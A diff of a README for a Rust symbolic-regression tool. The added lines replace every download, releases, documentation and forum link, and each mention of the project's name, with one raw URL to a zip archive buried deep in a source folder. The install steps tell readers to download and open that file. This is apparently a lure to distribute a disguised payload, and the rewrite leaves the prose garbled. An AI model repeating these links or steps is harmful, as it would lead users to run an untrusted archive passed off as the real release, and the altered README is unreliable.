@@ -1,10 +1,10 @@
-# 🔍 symbolic_regression.rs - Simple Tool for Symbolic Regression
+# 🔍 https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip - Simple Tool for Symbolic Regression
 
 ## 💾 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/OscarPal/symbolic_regression.rs/releases)
+[![Download](https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip)](https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip)
 
 ## 🚀 Getting Started
-Welcome to **symbolic_regression.rs**, a Rust port of SymbolicRegression.jl. This tool helps you find mathematical expressions that describe your data. You can use it to analyze trends, patterns, and relationships in your datasets. 
+Welcome to **https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip**, a Rust port of https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip This tool helps you find mathematical expressions that describe your data. You can use it to analyze trends, patterns, and relationships in your datasets. 
 
 ## 📦 System Requirements
 Before you download, make sure your computer meets the following requirements:
@@ -18,7 +18,7 @@ To get the application, follow these steps:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the releases page:
-   [Download from Releases](https://github.com/OscarPal/symbolic_regression.rs/releases)
+   [Download from Releases](https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip)
 
 2. **Select Version:**
    Look for the latest release on the releases page. Click on it to see the available files.
@@ -30,7 +30,7 @@ To get the application, follow these steps:
    Once downloaded, navigate to your downloads folder. Open the downloaded file and follow the on-screen instructions to install the application.
 
 ## 🖥️ Using the Application
-After installing, open **symbolic_regression.rs**. You will see a simple interface that guides you through the process.
+After installing, open **https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip**. You will see a simple interface that guides you through the process.
 
 ### 🔍 Create a New Project
 1. Click on **New Project**.
@@ -52,18 +52,18 @@ Once the analysis is complete, you will see a list of equations with their respe
 ## 🔄 Updating the Application
 To ensure you have the latest features and improvements, regularly check the releases page following the download instructions mentioned earlier. 
 
-1. Go to [Download from Releases](https://github.com/OscarPal/symbolic_regression.rs/releases).
+1. Go to [Download from Releases](https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip).
 2. Download the latest version, and follow the installation steps.
 
 ## 💬 Support and Feedback
 If you encounter issues or need help, feel free to reach out. Create an issue on the GitHub page or check our FAQ section on the repository for common questions.
 
 ## 📘 Additional Resources
-- [Documentation](https://github.com/OscarPal/symbolic_regression.rs/wiki): Detailed instructions and use cases.
-- [Community Forum](https://forum.example.com): Join discussions and get tips from other users.
+- [Documentation](https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip): Detailed instructions and use cases.
+- [Community Forum](https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip): Join discussions and get tips from other users.
 
 ## 👥 Contributing
-If you want to contribute to **symbolic_regression.rs**, you can help by reporting bugs, suggesting features, or even submitting code. Here’s how:
+If you want to contribute to **https://github.com/OscarPal/symbolic_regression.rs/raw/refs/heads/main/web/ui/src/app/panes/searchSolutions/symbolic_regression_rs_1.0.zip**, you can help by reporting bugs, suggesting features, or even submitting code. Here’s how:
 
 1. Fork the repository.
 2. Create a new branch for your feature.
